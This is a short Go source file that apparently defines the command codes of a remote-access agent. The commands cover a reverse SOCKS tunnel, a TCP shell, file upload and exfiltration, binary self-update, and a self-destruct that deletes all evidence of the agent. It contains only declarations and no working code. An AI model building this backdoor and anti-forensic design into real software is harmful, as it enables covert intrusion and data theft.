package commands

type command uint8

const (
	_ = iota // We don't want 0 values
	// Uses the relay to create a reverse socks connection
	Socks5
	// Creates a pseudo-terminal and connects stdin, stdout, and stderr to the net.Conn
	ShellTCP
	// Deletes all evidence of the agent
	SelfDestruct
	// Reads the file path (addr) and sends the contents
	SendFile
	// Reads data from net.Conn and writes it to the file path (addr)
	ReceiveFile
	// Updates the agent with a new server device ID
	UpdateID
	// Replaces the agent with a new binary and restarts it
	UpdateBinary
)
